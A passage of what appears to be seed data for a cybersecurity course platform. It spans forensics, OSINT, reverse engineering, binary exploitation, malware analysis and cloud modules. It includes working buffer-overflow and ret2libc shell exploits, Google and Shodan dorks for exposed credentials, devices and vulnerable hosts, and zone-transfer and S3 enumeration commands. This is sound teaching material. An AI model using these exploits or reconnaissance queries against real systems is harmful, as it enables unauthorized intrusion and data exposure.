\`\`\`bash
# List all processes
python3 vol.py -f memory.raw windows.pslist

# Process tree (parent-child)
python3 vol.py -f memory.raw windows.pstree

# Find hidden/injected processes
python3 vol.py -f memory.raw windows.psscan

# Processes with injected code
python3 vol.py -f memory.raw windows.malfind
\`\`\`

### Network Connections
\`\`\`bash
# Active and recent connections
python3 vol.py -f memory.raw windows.netstat
python3 vol.py -f memory.raw windows.netscan
\`\`\`

### File & Registry Analysis
\`\`\`bash
# Files in memory
python3 vol.py -f memory.raw windows.filescan

# Dump a specific file
python3 vol.py -f memory.raw windows.dumpfiles --virtaddr 0xADDRESS

# Registry hives
python3 vol.py -f memory.raw windows.registry.hivelist
\`\`\`

---

## Investigating Malware in Memory

\`\`\`bash
# Step 1: Get process list
python3 vol.py -f memory.raw windows.pslist

# Step 2: Look for suspicious processes
# - Misspellings: svchoost.exe, expIorer.exe
# - Unusual parent: cmd.exe spawned by Word
# - Unknown processes

# Step 3: Dump suspicious process
python3 vol.py -f memory.raw windows.dumpfiles --pid 1234

# Step 4: Analyze with VirusTotal
\`\`\`

---

## CTF Memory Forensics Checklist

\`\`\`
1. windows.info        → Profile, OS version
2. windows.pslist      → Running processes
3. windows.cmdline     → Command line arguments
4. windows.netscan     → C2 connections?
5. windows.malfind     → Injected shellcode
6. windows.hashdump    → Password hashes
7. windows.clipboard   → Clipboard contents
8. windows.filescan    → Find flag files
\`\`\``,
  },
  {
    domain_id: domainMap['forensics'], order: 3, estimated_time: 35,
    title: 'Steganography & Image Forensics',
    video_url: 'https://www.youtube.com/embed/xepNoHgNj0w',
    resources_links: [
      { title: 'AperiSolve — All-in-One Image Analysis', url: 'https://www.aperisolve.com', type: 'tool' },
      { title: 'StegOnline — Browser Based', url: 'https://stegonline.georgeom.net', type: 'tool' },
      { title: 'FotoForensics — ELA Analysis', url: 'https://fotoforensics.com', type: 'tool' },
    ],
    content_markdown: `# Steganography & Image Forensics

## Quick Triage Checklist

\`\`\`bash
# 1. Identify the real file type
file suspicious.jpg

# 2. Check for readable strings
strings suspicious.jpg | grep -i "flag\\|CV{\\|key\\|password"

# 3. Scan for embedded files
binwalk suspicious.jpg
binwalk -e suspicious.jpg  # Extract

# 4. View metadata
exiftool suspicious.jpg

# 5. Try steghide (most common CTF tool)
steghide extract -sf suspicious.jpg
steghide extract -sf suspicious.jpg -p ""
\`\`\`

---

## Hex Analysis

\`\`\`bash
# View file in hex
xxd suspicious.jpg | head -20  # Check magic bytes
xxd suspicious.jpg | tail -20  # Check end of file (appended data!)

# Search for flag pattern
xxd suspicious.jpg | grep "CV{"
\`\`\`

---

## PNG Specific Analysis

\`\`\`bash
# zsteg — PNG LSB steganography
zsteg image.png
zsteg -a image.png  # Try all channels

# pngcheck — validate PNG structure
pngcheck image.png

# Check PNG chunks
python3 -c "
import struct, sys
with open('image.png','rb') as f:
    data = f.read()
i = 8  # Skip PNG header
while i < len(data):
    length = struct.unpack('>I', data[i:i+4])[0]
    chunk_type = data[i+4:i+8].decode('ascii', errors='replace')
    print(f'Chunk: {chunk_type}, Length: {length}')
    i += 12 + length
"
\`\`\`

---

## Audio Steganography

\`\`\`bash
# Open in Sonic Visualiser
# View → Spectrogram
# Hidden images often visible in spectrogram!

# Alternatively: Audacity
# Analyze → Plot Spectrum

# MP3stego
mp3stego-decode -X audio.mp3 output.txt
\`\`\`

---

## Error Level Analysis (ELA)

Detects image manipulation — altered regions show higher error levels.
Use: fotoforensics.com → upload image → ELA tab

---

## Common CTF Patterns

| Technique | Tool | Command |
|-----------|------|---------|
| LSB in PNG | zsteg | zsteg image.png |
| Hidden file in JPEG | binwalk | binwalk -e image.jpg |
| Password protected | steghide | steghide extract -p pass |
| Text in metadata | exiftool | exiftool image |
| Appended ZIP | binwalk | binwalk -e / unzip |
| Audio spectrogram | Sonic Visualiser | Open → Spectrogram |`,
  },

  // ═══════════════════════════════════════════════════════════
  // 📡 OSINT — 2 Modules
  // ═══════════════════════════════════════════════════════════
  {
    domain_id: domainMap['osint'], order: 1, estimated_time: 35,
    title: 'OSINT Fundamentals & Google Dorking',
    video_url: 'https://www.youtube.com/embed/qwA6MmbeGNo',
    resources_links: [
      { title: 'OSINT Framework — All Tools Listed', url: 'https://osintframework.com', type: 'tool' },
      { title: 'Google Hacking Database (GHDB)', url: 'https://www.exploit-db.com/google-hacking-database', type: 'article' },
      { title: 'Shodan — Internet Device Search', url: 'https://shodan.io', type: 'tool' },
    ],
    content_markdown: `# OSINT Fundamentals & Google Dorking

## What is OSINT?
Open Source Intelligence (OSINT) is the collection and analysis of information from publicly available sources. No hacking required — everything is already public!

**Used by:** Penetration testers, investigators, journalists, law enforcement, stalkers (ethically: researchers studying threats).

---

## OSINT Sources

\`\`\`
People: Social media, public records, data breaches
Organizations: LinkedIn, company websites, job postings
Infrastructure: Shodan, Censys, DNS records
Documents: Google, Pastebin, GitHub
Location: Maps, geo-tagged photos, check-ins
\`\`\`

---

## Google Dorking (Advanced Search)

Google search operators that reveal hidden information:

### Basic Operators
\`\`\`
site:example.com              → Only results from this domain
site:example.com -site:www    → Subdomains only
filetype:pdf site:gov.in      → PDFs on Indian government sites
intitle:"index of"            → Directory listings (exposed!)
inurl:admin                   → URLs containing 'admin'
intext:"confidential"         → Pages with word confidential
\`\`\`

### Security Research Dorks
\`\`\`
filetype:sql "INSERT INTO"              → Database dumps
filetype:log inurl:password             → Password log files
intitle:"phpMyAdmin" inurl:phpMyAdmin   → Exposed databases
inurl:".env" DB_PASSWORD                → Environment files!
filetype:bak inurl:wp-config            → WordPress backups
intitle:"webcamXP" inurl:8080           → Exposed webcams
\`\`\`

### Finding Sensitive Documents
\`\`\`
site:company.com filetype:xls "salary"
site:company.com filetype:pdf "internal use only"
site:pastebin.com "company.com" password
\`\`\`

---

## Shodan — The Hacker's Google

Shodan indexes internet-connected devices (routers, cameras, servers, ICS).

\`\`\`
Basic searches:
apache country:IN           → Apache servers in India
port:22 "SSH" country:IN    → SSH servers in India
"default password"          → Devices with default passwords
"Raspberry Pi"              → Raspberry Pis online
webcam                      → Exposed webcams
"MongoDB Server"            → MongoDB databases

Advanced:
hostname:target.com         → Devices of a domain
org:"Tata Consultancy"      → Organization's devices
vuln:CVE-2021-44228         → Log4Shell vulnerable systems
\`\`\`

---

## theHarvester — Email & Domain Recon

\`\`\`bash
# Find emails, subdomains, hosts
theHarvester -d target.com -b google
theHarvester -d target.com -b linkedin
theHarvester -d target.com -b all
\`\`\`

---

## DNS Reconnaissance

\`\`\`bash
# DNS lookup
nslookup target.com
dig target.com ANY

# Find subdomains
sublist3r -d target.com
amass enum -d target.com

# Zone transfer attempt
dig axfr @ns1.target.com target.com
\`\`\``,
  },
  {
    domain_id: domainMap['osint'], order: 2, estimated_time: 40,
    title: 'Social Media OSINT & People Investigation',
    video_url: 'https://www.youtube.com/embed/qwA6MmbeGNo',
    resources_links: [
      { title: 'Maltego — Visual OSINT Tool', url: 'https://maltego.com', type: 'tool' },
      { title: 'HaveIBeenPwned — Breach Check', url: 'https://haveibeenpwned.com', type: 'tool' },
      { title: 'Bellingcat OSINT Toolkit', url: 'https://bellingcat.gitbook.io/toolkit/', type: 'article' },
    ],
    content_markdown: `# Social Media OSINT & People Investigation

## Ethical Boundaries

> **IMPORTANT:** OSINT must always be conducted ethically and legally.
> - Only investigate public information
> - Don't harass or stalk individuals
> - Follow applicable laws (IT Act 2000 in India)
> - Use findings only for authorized security work

---

## Building a Target Profile

When authorized to investigate a person:

\`\`\`
Step 1: Start with known info (name, email, company)
Step 2: Find social media accounts
Step 3: Cross-reference information
Step 4: Map connections and relationships
Step 5: Timeline events
\`\`\`

---

## Username Investigation

\`\`\`bash
# Sherlock — find username across 300+ sites
python3 sherlock.py target_username

# WhatsMyName
https://whatsmyname.app

# Namechk
https://namechk.com
\`\`\`

---

## Email OSINT

\`\`\`bash
# Find emails at a company
hunter.io → "example.com" → lists all found emails

# Verify email exists
https://verify-email.org

# Check breach databases
https://haveibeenpwned.com
https://dehashed.com

# Email header analysis
→ Forward email to yourself
→ View headers → Reveals original IP
\`\`\`

---

## Image & Location OSINT

### Reverse Image Search
\`\`\`
Google Images → drag and drop → find original source
Yandex Images → best for faces
TinEye → find all image appearances
\`\`\`

### Geolocating Images
From photo metadata:
\`\`\`bash
exiftool photo.jpg | grep GPS
# GPS Latitude: 28 deg 36' 36.00" N
# GPS Longitude: 77 deg 13' 48.00" E
\`\`\`

From visual clues in images:
- Street signs, landmarks
- Sun position → time of day
- Vegetation → climate zone
- Architecture style → region

---

## LinkedIn OSINT

\`\`\`
What to look for:
- Employee names and roles
- Tech stack from job postings ("We use Node.js, MongoDB...")
- Company structure
- Email format (firstname.lastname@company.com)
- Recent hires (new attack surface)
\`\`\`

---

## Breach Data Analysis

\`\`\`bash
# Check if email appears in breaches
haveibeenpwned.com

# Dehashed — breach database search
dehashed.com → search email/username

# IntelX — indexed breaches
intelx.io
\`\`\`

---

## Automating OSINT — SpiderFoot

\`\`\`bash
# Install
pip3 install spiderfoot

# Run web UI
python3 sf.py -l 127.0.0.1:5001

# CLI scan
python3 sfcli.py -s target.com -t INTERNET_NAME
\`\`\``,
  },

  // ═══════════════════════════════════════════════════════════
  // ⚙️ REVERSE ENGINEERING — 2 Modules
  // ═══════════════════════════════════════════════════════════
  {
    domain_id: domainMap['reverse-engineering'], order: 1, estimated_time: 60,
    title: 'Reverse Engineering Fundamentals',
    video_url: 'https://www.youtube.com/embed/d4Pgi5XML8E',
    resources_links: [
      { title: 'Ghidra — Free NSA Decompiler', url: 'https://ghidra-sre.org', type: 'tool' },
      { title: 'Crackmes.one — RE Practice', url: 'https://crackmes.one', type: 'tool' },
      { title: 'x86 Assembly Guide', url: 'https://cs.virginia.edu/~evans/cs216/guides/x86.html', type: 'article' },
    ],
    content_markdown: `# Reverse Engineering Fundamentals

## What is Reverse Engineering?
Reverse Engineering (RE) is the process of analyzing compiled binary code to understand its functionality, find vulnerabilities, or recover lost source code — without access to the original source.

**Applications:**
- Malware analysis (understand what malware does)
- CTF challenges (crack license checks, find hidden flags)
- Vulnerability research (find bugs in closed-source software)
- Interoperability (understand proprietary protocols)

---

## Binary Formats

| Format | OS | Extension |
|--------|----|-----------|
| ELF | Linux | no extension / .elf |
| PE | Windows | .exe, .dll |
| Mach-O | macOS | no extension |

\`\`\`bash
file binary_file    # Identifies format
\`\`\`

---

## First Steps — Static Analysis

Before running anything:

\`\`\`bash
# 1. What type of file?
file crackme

# 2. What strings are inside?
strings crackme | grep -i "flag\\|password\\|correct\\|wrong"

# 3. What functions are called? (imports)
nm crackme            # Symbol table
objdump -d crackme    # Disassemble
readelf -a crackme    # ELF info

# 4. Is it packed/obfuscated?
strings crackme | wc -l   # Very few strings → likely packed
\`\`\`

---

## x86 Assembly Basics

You don't need to master assembly — recognize patterns!

\`\`\`nasm
; Registers (think of as variables)
EAX - General purpose (return values)
EBX - General purpose
ECX - Counter (loops)
EDX - General purpose
ESP - Stack pointer
EBP - Base pointer
EIP - Instruction pointer (current line)

; Common instructions
mov eax, 5      ; EAX = 5
add eax, ebx    ; EAX = EAX + EBX
cmp eax, ebx    ; Compare (sets flags)
je  label       ; Jump if Equal
jne label       ; Jump if Not Equal
call function   ; Call function
ret             ; Return from function
push eax        ; Push to stack
pop  eax        ; Pop from stack
\`\`\`

---

## Ghidra — Free Decompiler

\`\`\`
1. Download: ghidra-sre.org
2. File → New Project → Import binary
3. Double-click → Analyze (accept defaults)
4. Symbol Tree → Functions → main
5. Decompiler window shows C-like code!
\`\`\`

---

## CTF Reverse Engineering Approach

\`\`\`bash
# Step 1: Run it
./crackme
# "Enter password: "

# Step 2: Find the comparison
strings crackme              # Look for hardcoded strings
ltrace ./crackme             # Trace library calls (strcmp!)
strace ./crackme             # Trace system calls

# Step 3: If ltrace shows:
# strcmp("myinput", "s3cr3t_flag") = -1
# The password is: s3cr3t_flag!

# Step 4: Open in Ghidra for complex cases
# Find main → Find password check function
# Look for strcmp, memcmp comparisons
\`\`\``,
  },
  {
    domain_id: domainMap['reverse-engineering'], order: 2, estimated_time: 50,
    title: 'Dynamic Analysis & Debugging with GDB',
    video_url: 'https://www.youtube.com/embed/PorfLSr3DDI',
    resources_links: [
      { title: 'GDB Tutorial', url: 'https://www.gdbtutorial.com', type: 'article' },
      { title: 'GDB PEDA Plugin', url: 'https://github.com/longld/peda', type: 'tool' },
      { title: 'x64dbg — Windows Debugger', url: 'https://x64dbg.com', type: 'tool' },
    ],
    content_markdown: `# Dynamic Analysis & Debugging with GDB

## Why Dynamic Analysis?
Static analysis (reading code) has limits — some code is:
- Obfuscated/encrypted (unpacks at runtime)
- Anti-disassembly tricks
- Complex algorithms (easier to observe than read)

Dynamic analysis = run the program and observe!

---

## GDB — GNU Debugger

\`\`\`bash
# Start GDB
gdb ./crackme

# GDB Commands
run                    → Execute program
run arg1 arg2          → Run with arguments
break main             → Set breakpoint at main
break *0x4011b6        → Breakpoint at address
info breakpoints       → List breakpoints
continue (c)           → Continue execution
next (n)               → Next line (step over)
step (s)               → Step into function
finish                 → Run until function returns
quit (q)               → Exit GDB
\`\`\`

---

## Examining Memory & Registers

\`\`\`bash
# View registers
info registers          → All registers
print $eax              → Single register

# Examine memory
x/10x $esp              → 10 hex words at stack pointer
x/s 0x4050a0            → String at address
x/20i $eip              → 20 instructions at current position

# Set values (patch on the fly!)
set $eax = 1            → Change register
set {int}0x4050a0 = 0   → Change memory
\`\`\`

---

## GDB-PEDA — Enhanced GDB

\`\`\`bash
# Install
git clone https://github.com/longld/peda.git ~/peda
echo "source ~/peda/peda.py" >> ~/.gdbinit

# PEDA gives you:
# - Colorized output
# - Registers, stack, disassembly in one view
# - Pattern create/search for buffer overflow offsets
\`\`\`

---

## Patching Binaries

Sometimes you want to change a comparison result:

\`\`\`bash
# In GDB: Change jump condition
# If program does: je success_label (jump if equal)
# Change to: jmp success_label (always jump)

# Patch instruction in GDB
set {unsigned char}0x401234 = 0xeb  # Change je to jmp (short)

# Permanent patch with hex editor
# Find: 74 (je) → Replace with: eb (jmp)
\`\`\`

---

## Anti-Debugging Techniques

Common tricks malware uses to detect debugging:

\`\`\`
IsDebuggerPresent()     → Check debugger flag in PEB
RDTSC timing checks     → Measure execution time
ptrace detection        → Check if being traced
Hardware breakpoint checks
\`\`\`

**Bypassing:**
\`\`\`bash
# GDB: After hitting IsDebuggerPresent
set $eax = 0     # Force return value to 0 (not debugging)
\`\`\`

---

## CTF Dynamic Analysis Tips

\`\`\`bash
# Watch all function calls
ltrace -i ./crackme 2>&1 | grep -v "^---"

# Find where strcmp/memcmp is called
break strcmp
run
# GDB stops → print $rsi → reveals expected string!

# Automated: angr (symbolic execution)
pip install angr
python3 -c "
import angr
proj = angr.Project('./crackme')
simgr = proj.factory.simulation_manager()
simgr.explore(find=0x401234, avoid=0x401567)
print(simgr.found[0].posix.dumps(0))
"
\`\`\``,
  },

  // ═══════════════════════════════════════════════════════════
  // 💣 BINARY EXPLOITATION — 2 Modules
  // ═══════════════════════════════════════════════════════════
  {
    domain_id: domainMap['binary-exploitation'], order: 1, estimated_time: 75,
    title: 'Buffer Overflow — Theory to Exploit',
    video_url: 'https://www.youtube.com/embed/1S0aBV-Waeo',
    resources_links: [
      { title: 'pwntools — Exploit Development Framework', url: 'https://docs.pwntools.com', type: 'tool' },
      { title: 'pwn.college — Free Binary Exploitation', url: 'https://pwn.college', type: 'article' },
      { title: 'LiveOverflow — Binary Hacking YouTube', url: 'https://www.youtube.com/c/LiveOverflow', type: 'video' },
    ],
    content_markdown: `# Buffer Overflow — Theory to Exploit

## What is a Buffer Overflow?
A buffer overflow occurs when a program writes more data to a memory buffer than it can hold, overwriting adjacent memory — including control data like return addresses.

Discovered 1988 (Morris Worm) — still relevant today!

---

## Memory Layout

\`\`\`
High Addresses
┌─────────────────────┐
│  Command Line Args  │
├─────────────────────┤
│  Environment Vars   │
├─────────────────────┤
│   Stack (↓ grows)   │  ← Local variables
│   Return Address    │  ← TARGET: overwrite this!
│   Saved EBP         │
│   Local Variables   │
│   buffer[64]        │  ← Overflow starts here
├─────────────────────┤
│   Heap  (↑ grows)   │  ← Dynamic memory
├─────────────────────┤
│   BSS               │  ← Uninitialized globals
├─────────────────────┤
│   Data              │  ← Initialized globals
├─────────────────────┤
│   Text (Code)       │  ← Program instructions
└─────────────────────┘
Low Addresses
\`\`\`

---

## The Vulnerable Code

\`\`\`c
#include <stdio.h>
#include <string.h>

void secret_function() {
    printf("You win! Flag: CV{buff3r_0v3rfl0w_pwnd}\\n");
}

void vulnerable() {
    char buffer[64];
    gets(buffer);       // ← DANGEROUS! No bounds check!
    printf("You said: %s\\n", buffer);
}

int main() {
    vulnerable();
    return 0;
}
\`\`\`

---

## Finding the Offset

\`\`\`python
from pwn import *

# Generate cyclic pattern
pattern = cyclic(200)
print(pattern)

# Run program with pattern as input
# It will crash → note the EIP/RIP value

# Find offset
offset = cyclic_find(0x61616166)  # Value from EIP at crash
print(f"Offset: {offset}")        # e.g., 72
\`\`\`

---

## Basic Exploit

\`\`\`python
from pwn import *

# Connect to process or remote
p = process('./vuln')
# p = remote('challenge.server.com', 1337)

# Find secret_function address with:
# objdump -d vuln | grep secret
# or: readelf -s vuln | grep secret
win_addr = 0x4011b6  # Address of secret_function

offset = 72          # Bytes to reach return address
payload = b'A' * offset + p64(win_addr)

p.sendline(payload)
p.interactive()      # Get our shell!
\`\`\`

---

## Modern Protections & Bypasses

| Protection | Description | Bypass |
|------------|-------------|--------|
| **ASLR** | Randomizes memory addresses | Info leak + calculate offset |
| **NX/DEP** | Stack not executable | ROP chains |
| **Stack Canary** | Random value before return addr | Leak canary value |
| **PIE** | Position Independent Executable | Info leak for base address |

---

## Checking Protections

\`\`\`bash
# checksec — show binary protections
checksec vuln

# Output:
# RELRO:    Partial RELRO
# Stack:    No canary found    ← No canary!
# NX:       NX disabled        ← Stack executable!
# PIE:      No PIE             ← Fixed addresses!
\`\`\``,
  },
  {
    domain_id: domainMap['binary-exploitation'], order: 2, estimated_time: 60,
    title: 'Format String & ROP Chain Attacks',
    video_url: 'https://www.youtube.com/embed/t1LH9D5cuK4',
    resources_links: [
      { title: 'ROPgadget Tool', url: 'https://github.com/JonathanSalwan/ROPgadget', type: 'tool' },
      { title: 'pwndbg — GDB Plugin for Pwn', url: 'https://github.com/pwndbg/pwndbg', type: 'tool' },
      { title: 'Format String Attack Guide', url: 'https://owasp.org/www-community/attacks/Format_string_attack', type: 'article' },
    ],
    content_markdown: `# Format String & ROP Chain Attacks

## Format String Vulnerability

### What is it?
When user input is passed directly as the format string to printf():

\`\`\`c
// SAFE
printf("%s", user_input);

// VULNERABLE
printf(user_input);   // ← user controls format!
\`\`\`

### Reading Memory
\`\`\`
Input: %x.%x.%x.%x.%x
Output: f7f8b580.ffffd6c4.0.0.31337
(Reading stack values as hex!)

Input: %s
Output: (reads memory as string → crash or data leak)

Input: %7$x
Output: (reads 7th argument directly)
\`\`\`

### Writing to Memory (Dangerous!)
\`\`\`
%n → writes number of bytes printed so far to pointer
→ Can overwrite arbitrary memory!
\`\`\`

---

## Return-Oriented Programming (ROP)

### Why ROP?
When NX protection is enabled, the stack is not executable.
ROP reuses existing code snippets ("gadgets") already in the binary.

### Gadgets
Small instruction sequences ending with ret:
\`\`\`
0x401234: pop rdi; ret
0x401240: pop rsi; ret
0x401250: pop rdx; ret
0x401260: syscall; ret
\`\`\`

### Building a ROP Chain

\`\`\`bash
# Find gadgets
ROPgadget --binary ./vuln --rop

# Common useful gadgets
pop rdi; ret    → Set function argument 1
pop rsi; ret    → Set function argument 2
ret             → Stack alignment (needed for system())
\`\`\`

### ret2libc Attack (Classic ROP)

\`\`\`python
from pwn import *

p = process('./vuln')
elf = ELF('./vuln')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

# Gadgets
pop_rdi = 0x401234  # pop rdi; ret gadget
ret_gadget = 0x40101a  # ret (alignment)

# Addresses
puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
main = elf.sym['main']

# Step 1: Leak libc address via puts
payload = b'A' * 72
payload += p64(pop_rdi) + p64(puts_got)
payload += p64(puts_plt)
payload += p64(main)  # Return to main for second exploit

p.sendline(payload)
leaked = u64(p.recvline().strip().ljust(8, b'\\x00'))
libc.address = leaked - libc.sym['puts']

# Step 2: Call system("/bin/sh")
bin_sh = next(libc.search(b'/bin/sh'))
system = libc.sym['system']

payload2 = b'A' * 72
payload2 += p64(ret_gadget)
payload2 += p64(pop_rdi) + p64(bin_sh)
payload2 += p64(system)

p.sendline(payload2)
p.interactive()  # Shell!
\`\`\`

---

## Practice Resources

\`\`\`
pwn.college      → Structured pwn challenges (free!)
picoCTF          → Beginner friendly
HackTheBox       → Pwn challenges
ROPemporium      → ROP specific challenges
\`\`\``,
  },

  // ═══════════════════════════════════════════════════════════
  // 🦠 MALWARE ANALYSIS — 2 Modules
  // ═══════════════════════════════════════════════════════════
  {
    domain_id: domainMap['malware-analysis'], order: 1, estimated_time: 50,
    title: 'Malware Analysis — Types & Static Analysis',
    video_url: 'https://www.youtube.com/embed/9UMR81MBdkE',
    resources_links: [
      { title: 'VirusTotal — Multi-AV Scanner', url: 'https://virustotal.com', type: 'tool' },
      { title: 'Any.run — Interactive Sandbox', url: 'https://any.run', type: 'tool' },
      { title: 'MalwareBazaar — Sample Database', url: 'https://bazaar.abuse.ch', type: 'tool' },
    ],
    content_markdown: `# Malware Analysis — Types & Static Analysis

## Malware Categories

| Type | Behavior | Example |
|------|---------|---------|
| **Virus** | Infects files, self-replicates | ILOVEYOU |
| **Worm** | Spreads over network autonomously | WannaCry |
| **Trojan** | Disguised as legitimate software | Back Orifice |
| **Ransomware** | Encrypts files, demands payment | LockBit |
| **Rootkit** | Hides itself, elevated persistence | TDL4 |
| **Spyware** | Monitors user activity | FinFisher |
| **Keylogger** | Records keystrokes | Olympic Vision |
| **Botnet** | Remote controlled network | Mirai |
| **Adware** | Displays unwanted ads | Fireball |
| **Cryptominer** | Mines cryptocurrency | XMRig |

---

## Safe Analysis Environment Setup

\`\`\`
⚠️  CRITICAL: NEVER analyze malware on your main computer!

Recommended Setup:
1. Install VirtualBox (free) or VMware
2. Create Windows 10 VM
3. Take a CLEAN SNAPSHOT before analysis
4. Disable network OR use isolated network
5. Use FlareVM or REMnux (pre-configured VMs)
\`\`\`

**FlareVM** (Windows) — FLARE's malware analysis distro:
\`\`\`
Includes: IDA Free, x64dbg, Ghidra, PE-bear,
         Wireshark, Procmon, Regshot, and 100+ tools
\`\`\`

---

## Static Analysis — Without Running

### Step 1: Hashing & VirusTotal
\`\`\`bash
md5sum malware.exe
sha256sum malware.exe
# Submit hash to virustotal.com → 70+ AV engines check it!
\`\`\`

### Step 2: File Type & PE Analysis
\`\`\`bash
file malware.exe           # Confirm it's PE executable
strings malware.exe        # Extract readable strings
strings malware.exe | grep -i "http\\|\\.com\\|\\.exe\\|cmd\\|powershell"
\`\`\`

### Step 3: PE Header Analysis (Windows .exe)
\`\`\`
PE-bear / PEview / pestudio:
- Imports: Which DLLs/functions used?
  → CreateRemoteThread: process injection
  → RegSetValueEx: registry persistence
  → WinExec/ShellExecute: executing commands
  → InternetOpen/HttpSend: network communication
  → CryptEncrypt: encryption (ransomware!)

- Exports: Functions the malware provides
- Sections: .text (code), .data (data), .rsrc (resources)
- Suspicious: High entropy sections → likely packed/encrypted
\`\`\`

### Step 4: Strings Analysis
\`\`\`bash
# Look for:
strings malware.exe | grep -iE "\\.exe|\\.dll|cmd\\.exe|powershell"
strings malware.exe | grep -iE "http|ftp|tcp|socket"
strings malware.exe | grep -iE "registry|HKEY|Software"
strings malware.exe | grep -iE "password|encrypt|ransom"
strings malware.exe | grep -iE "[0-9]{1,3}\\.[0-9]{1,3}"  # IP addresses
\`\`\`

---

## Yara Rules — Malware Signatures

\`\`\`yara
rule Ransomware_Generic {
    meta:
        description = "Generic ransomware detection"
        author = "OpenLabs"
    strings:
        $ransom1 = "Your files have been encrypted" nocase
        $ransom2 = "Bitcoin" nocase
        $ransom3 = "decrypt" nocase
        $ext1 = ".locked"
        $ext2 = ".encrypted"
    condition:
        any of ($ransom*) and any of ($ext*)
}
\`\`\``,
  },
  {
    domain_id: domainMap['malware-analysis'], order: 2, estimated_time: 55,
    title: 'Dynamic Malware Analysis & Sandboxing',
    video_url: 'https://www.youtube.com/embed/GEodMkM0wbg',
    resources_links: [
      { title: 'REMnux — Linux Malware Analysis', url: 'https://remnux.org', type: 'tool' },
      { title: 'Cuckoo Sandbox — Open Source', url: 'https://cuckoosandbox.org', type: 'tool' },
      { title: 'FLARE-VM Setup Guide', url: 'https://github.com/mandiant/flare-vm', type: 'tool' },
    ],
    content_markdown: `# Dynamic Malware Analysis & Sandboxing

## Dynamic Analysis — Running the Malware

**Goal:** Observe malware behavior in a controlled environment.

---

## Pre-Analysis Baseline

Before running malware, document the clean state:

\`\`\`
Tools for baseline:
- Regshot → Snapshot registry before and after
- Process Monitor → All file/registry activity
- Wireshark → All network activity
- Process Hacker → All running processes
\`\`\`

---

## Process Monitor (Procmon) Setup

\`\`\`
1. Run Procmon as Administrator
2. Set filters:
   Filter → Process Name → contains → malware.exe
3. Run malware.exe
4. Analyze activity:
   - File operations: What files created/modified/deleted?
   - Registry operations: Persistence mechanism?
   - Network operations: C2 communications?
\`\`\`

**Key Registry Locations for Persistence:**
\`\`\`
HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run
HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run
HKLM\\System\\CurrentControlSet\\Services  (malicious service)
\`\`\`

---

## Wireshark During Execution

\`\`\`
1. Start Wireshark capture
2. Run malware
3. Look for:
   - DNS queries → C2 domain resolution
   - HTTP/HTTPS → Data exfiltration, C2 communication
   - IRC traffic → Older botnet protocol
   - Unknown ports → Custom C2 protocol
\`\`\`

**FakeNet-NG** — Simulates internet for isolated analysis:
\`\`\`bash
fakenet-ng
# Creates fake DNS, HTTP servers
# Captures all requests malware makes
\`\`\`

---

## Process Analysis Tools

\`\`\`
Process Hacker:
- See all running processes (even hidden ones!)
- Network connections per process
- Memory strings per process
- Inject/terminate processes

Autoruns (Sysinternals):
- All persistence mechanisms in one view
- Registry, startup folder, services, drivers
- Compare before/after malware execution
\`\`\`

---

## Online Sandboxes (Safest Option!)

\`\`\`
any.run         → Interactive analysis, real-time behavior
hybrid-analysis.com → Automated + detailed report
app.any.run     → Free tier available
cuckoo          → Self-hosted open source sandbox
\`\`\`

---

## Identifying C2 Communication

\`\`\`python
# Common C2 indicators:
# 1. Beacon pattern (regular intervals)
# 2. User-Agent strings (often custom)
# 3. Base64 encoded payloads in HTTP
# 4. Large DNS queries (DNS exfiltration)
# 5. Encrypted traffic to unknown IPs

# Extract IOCs from analysis:
# - IP addresses contacted
# - Domain names
# - URLs
# - File hashes dropped
# - Registry keys modified
# - Mutex names (prevent double execution)
\`\`\`

---

## Indicators of Compromise (IOCs)

\`\`\`
File-based IOCs:
- Hash: SHA256 of malware file
- File path: C:\\Windows\\Temp\\malware.exe
- File name: svchoost.exe (misspelled!)

Network IOCs:
- IP: 185.234.xxx.xxx
- Domain: updates.malware-c2.com
- URL: /gate.php?id=VICTIM_ID

Registry IOCs:
- HKCU\\...\\Run → malware.exe

Behavioral IOCs:
- Creates scheduled task
- Disables Windows Defender
- Encrypts files with .locked extension
\`\`\``,
  },

  // ═══════════════════════════════════════════════════════════
  // ☁️ CLOUD SECURITY — 2 Modules
  // ═══════════════════════════════════════════════════════════
  {
    domain_id: domainMap['cloud-security'], order: 1, estimated_time: 55,
    title: 'Cloud Security Fundamentals & AWS Misconfigurations',
    video_url: 'https://www.youtube.com/embed/QC8iQqtG0hg',
    resources_links: [
      { title: 'flaws.cloud — AWS CTF (Free)', url: 'http://flaws.cloud', type: 'tool' },
      { title: 'CloudGoat — Vulnerable AWS Environment', url: 'https://github.com/RhinoSecurityLabs/cloudgoat', type: 'tool' },
      { title: 'AWS Security Best Practices', url: 'https://aws.amazon.com/security/security-learning/', type: 'article' },
    ],
    content_markdown: `# Cloud Security Fundamentals & AWS Misconfigurations

## Cloud Security Fundamentals

### Shared Responsibility Model

\`\`\`
┌────────────────────────────────────────┐
│          CUSTOMER Responsibility        │
│  ┌──────────────────────────────────┐  │
│  │ Your Data & Applications         │  │
│  │ OS configuration (EC2)           │  │
│  │ Network & firewall settings      │  │
│  │ IAM users & permissions          │  │
│  └──────────────────────────────────┘  │
├────────────────────────────────────────┤
│           AWS Responsibility            │
│  Physical hardware & datacenters       │
│  Network infrastructure                │
│  Hypervisor (EC2 isolation)            │
│  Managed services (RDS, S3 storage)   │
└────────────────────────────────────────┘
\`\`\`

---

## AWS Core Services for Security

| Service | Purpose | Security Relevance |
|---------|---------|-------------------|
| IAM | Identity & Access | Over-privilege = major risk |
| S3 | Object Storage | Public bucket exposure |
| EC2 | Virtual Machines | Exposed ports, IMDSv1 |
| VPC | Virtual Network | Security groups = firewall |
| CloudTrail | API Logging | Attacker detection |
| GuardDuty | Threat Detection | Anomaly detection |

---

## S3 Bucket Misconfigurations

### Finding Public Buckets
\`\`\`bash
# Check if bucket is publicly accessible
curl https://bucket-name.s3.amazonaws.com/

# List bucket contents (if public)
aws s3 ls s3://bucket-name --no-sign-request

# Common bucket naming patterns
company-name-backup
company-name-dev
company-name-logs
company-name-data
\`\`\`

### Tools for S3 Recon
\`\`\`bash
# S3Scanner
python3 s3scanner.py --bucket company-name

# AWSBucketDump
python3 AWSBucketDump.py -D -l bucket_list.txt

# GrayhatWarfare — search public buckets
grayhatwarfare.com
\`\`\`

---

## IAM Vulnerabilities

### Common IAM Mistakes
\`\`\`json
// ❌ DANGEROUS — wildcard permissions
{
